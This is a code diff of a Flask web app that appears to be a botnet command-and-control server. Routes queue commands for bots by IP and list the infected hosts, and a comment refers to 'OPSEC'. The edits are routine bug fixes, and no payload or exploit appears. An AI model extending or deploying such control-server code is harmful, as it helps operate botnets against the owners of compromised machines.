@@ -235,7 +235,7 @@ def botpush(bot_ip):
         # Query and get the bot which has the bot_ip, and then append the command to it 
 
         query_bot = Bot.query.filter_by(ip=bot_ip).first()
-        cmd = Command(cmd, query_bot.bot_id, bot_ip)
+        cmd = Command(cmd, query_bot.id, bot_ip)
 
         if len(query_bot.cmds) < 1:
             try:
@@ -350,16 +350,19 @@ def botresult(bot_ip):
     
 
 # TODO: Change to POST, implement master authentication for OPSEC 
+# TODO: Change the result to json, as an API endpoint 
 @app.route('/bot/list', methods=['GET'])
 def botlist():
     botlist = Bot.query.all()
 
+    result = '' 
+
     for bot in botlist:
-        print(bot.get_info())
+        result += bot.get_info() + '\n'
 
     #print(type(botlist))
 
-    return ''
+    return result
 
 
 init_db()
